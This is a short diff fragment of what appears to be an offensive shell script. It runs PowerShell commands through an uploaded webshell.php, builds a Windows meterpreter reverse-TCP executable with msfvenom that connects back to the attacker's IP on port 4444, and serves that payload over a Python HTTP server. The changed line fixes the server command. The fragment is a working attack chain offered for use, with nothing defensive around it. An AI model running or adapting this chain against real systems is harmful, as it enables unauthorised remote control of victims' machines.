@@ -36,4 +36,4 @@ curl -s -X GET "http://$target_ip/uploads/webshell.php?cmd=powershell%20-c%20%22
 
 echo "5 - METERPRETER"
 msfvenom -p windows/x64/meterpreter_reverse_tcp -LHOST=$attack_ip LPORT=4444 -f exe -o $result_folder/meterpreter.exe
--m http.server 4444 -d $result_folder
+python3 -m http.server 4444 -d $result_folder
